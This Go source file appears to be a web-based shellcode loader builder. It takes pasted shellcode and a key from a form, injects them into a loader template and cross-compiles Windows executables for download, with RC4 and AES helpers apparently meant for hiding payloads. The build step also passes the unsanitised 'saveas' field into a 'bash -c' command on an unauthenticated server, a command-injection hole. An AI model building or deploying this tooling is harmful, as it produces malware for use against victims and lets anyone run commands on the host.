package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rc4"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

var shelltemplate *template.Template

type DownloadLink struct {
	Link string
}

var dwnloadlink DownloadLink

func init() {
	shelltemplate = template.Must(template.ParseFiles("templates/goshell.html"))
	dwnloadlink = DownloadLink{}
}

func main() {
	startserver()
}

func updatetemplate(basefilepath, outfilepath, key, shellcode string) {
	file, err := os.Open(basefilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "SHELLCODEHERE") {
			str = strings.Replace(str, "SHELLCODEHERE", shellcode, 1)
		}
		if strings.Contains(str, ":KEY:") {
			str = strings.Replace(str, ":KEY:", key, 1)
		}

		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func copyfile(sourcepath, destpath string) {
	srcpubkfile, err := os.Open(sourcepath)
	if err != nil {
		fmt.Println(err)
	}
	defer srcpubkfile.Close()
	newpubkFile, err := os.Create(destpath)
	if err != nil {
		fmt.Println(err)
	}
	defer newpubkFile.Close()

	scanner := bufio.NewScanner(srcpubkfile)
	for scanner.Scan() {
		str := scanner.Text()

		newpubkFile.WriteString(str + "\n")
	}

	if err = scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func goshellindex(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := shelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		enckey := req.Form.Get("encryptkey")
		shellcode := req.Form.Get("shellcode")
		//fmt.Println(shellcode)

		//encryptedshell := string(encryptshellcoderc4(enckey, shellcode))

		//fmt.Println(encryptedshell)

		updatetemplate("basefiles/goshell.go", "download/goshell.go", enckey, shellcode)
		buildexe("download/"+saveas+".exe", "download/goshell.go")
		time.Sleep(5000 * time.Millisecond)
		if runtime.GOOS == "windows" {
			dwnloadlink.Link = "download/" + saveas + ".exe"
		} else {
			dwnloadlink.Link = "download/" + saveas
		}
		//os.Remove("download/goshell.go")
		err = shelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}
	}
}
func encryptshellcoderc4(keyval, texttoencrypt string) []byte {
	c, err := rc4.NewCipher([]byte(keyval))
	if err != nil {
		fmt.Println(err)
	}

	encrypted := make([]byte, len(texttoencrypt))
	c.XORKeyStream(encrypted, []byte(texttoencrypt))
	return encrypted
}

func encryptshellcode(keyval, texttoencrypt string) []byte {
	//fmt.Println("Encryption Program v0.01")

	text := []byte(texttoencrypt)
	key := []byte(keyval)

	// generate a new aes cipher using our 32 byte long key
	cipherBlock, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(cipherBlock)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	return (gcm.Seal(nonce, nonce, text, nil))
}

func startserver() {
	router := mux.NewRouter()
	router.HandleFunc("/", goshellindex)
	router.PathPrefix("/static/css/").Handler(http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css/"))))
	router.PathPrefix("/download/").Handler(http.StripPrefix("/download/", http.FileServer(http.Dir("download/"))))
	router.PathPrefix("/outfiles/").Handler(http.StripPrefix("/outfiles/", http.FileServer(http.Dir("outfiles/"))))

	srv := &http.Server{
		Handler: router,
		Addr:    "0.0.0.0:8085",
		// Good practice: enforce timeouts for servers you create!
		WriteTimeout: 180 * time.Second,
		ReadTimeout:  180 * time.Second,
	}
	srv.ListenAndServe()
}

func buildexe(exepath string, gofilepath string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		execargs := "GOOS=windows GOARCH=386 go build -o " + exepath + " " + gofilepath
		fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	} else {
		cmd := exec.Command("go", "build", "-o", exepath+".exe", gofilepath)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	}
}
